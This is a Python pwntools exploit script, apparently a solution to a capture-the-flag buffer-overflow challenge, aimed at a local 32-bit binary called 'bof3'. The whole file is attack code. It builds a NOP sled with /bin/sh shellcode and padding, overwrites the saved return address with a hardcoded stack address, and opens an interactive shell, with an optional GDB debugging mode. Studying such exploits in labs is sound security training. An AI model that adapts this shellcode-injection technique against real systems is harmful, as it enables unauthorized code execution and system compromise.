from pwn import *

elf = context.binary = ELF("./bof3")

SHELLCODE = asm(shellcraft.sh())

PADDING = b"Platy\x00" + b"\x90" * (cyclic_find(0x61716361) - len(SHELLCODE) - 30) + SHELLCODE + b"A" * 30

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b *0x08048507\ncontinue')

    return process(elf.path)

p = start()

p.sendline(PADDING + p32(0xffffd1c4))
p.interactive()
